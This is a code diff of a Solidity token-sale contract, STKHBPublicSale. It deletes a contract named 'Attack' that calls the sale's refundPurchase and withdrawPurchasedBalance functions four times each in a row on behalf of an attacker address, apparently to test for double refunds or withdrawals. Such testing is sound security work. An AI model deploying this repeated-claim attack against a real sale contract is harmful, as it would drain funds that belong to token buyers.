@@ -1285,33 +1285,4 @@ contract STKHBPublicSale is Ownable {
         require(block.timestamp >= saleEnd);
         _;
     }
-}    
-
-contract Attack is Ownable {
-
-    address victim;
-    
-    address attacker;
-    
-    constructor(address _victim, address _attacker) {
-        victim = _victim;
-        attacker = _attacker;
-    }
-    
-    
-    function attack1() public {
-        STKHBPublicSale sale = STKHBPublicSale(victim);
-        sale.refundPurchase(attacker);
-        sale.refundPurchase(attacker);
-        sale.refundPurchase(attacker);
-        sale.refundPurchase(attacker);
-    }
-    
-    function attack2() public {
-        STKHBPublicSale sale = STKHBPublicSale(victim);
-        sale.withdrawPurchasedBalance(attacker);
-        sale.withdrawPurchasedBalance(attacker);
-        sale.withdrawPurchasedBalance(attacker);
-        sale.withdrawPurchasedBalance(attacker);
-    }
 }  
